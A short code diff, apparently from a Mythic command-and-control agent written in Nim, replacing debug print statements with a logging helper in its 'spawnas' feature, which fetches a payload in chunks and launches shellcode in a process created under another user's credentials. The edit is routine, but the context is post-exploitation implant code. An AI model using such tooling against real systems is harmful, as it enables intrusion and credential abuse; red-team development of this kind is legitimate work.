@@ -22,7 +22,7 @@ proc spawnas*(taskId: string, params: JsonNode): JsonNode =
   when defined(windows):
     try:
       let args = to(params, SpawnAsArgs)
-      debug &"[DEBUG] SpawnAs: user={args.domain}\\{args.username}, technique={args.technique}, uuid={args.uuid}"
+      debugLog "spawnas", &"SpawnAs: user={args.domain}\\{args.username}, technique={args.technique}, uuid={args.uuid}"
       
       # Return initial response to request the payload file from Mythic
       return %*{
@@ -54,7 +54,7 @@ proc processSpawnAsChunk*(taskId: string, params: JsonNode, chunkData: string,
       for b in decodedChunk:
         fileData.add(cast[byte](b))
       
-      debug &"[DEBUG] SpawnAs: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
+      debugLog "spawnas", &"SpawnAs: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
       
       if currentChunk < totalChunks:
         return %*{
@@ -108,7 +108,7 @@ proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): Js
       
       var pi: PROCESS_INFORMATION
       
-      debug &"[DEBUG] SpawnAs: Creating process as {args.domain}\\{args.username}"
+      debugLog "spawnas", &"SpawnAs: Creating process as {args.domain}\\{args.username}"
       
       let createResult = CreateProcessWithLogonW(
         wUsername,
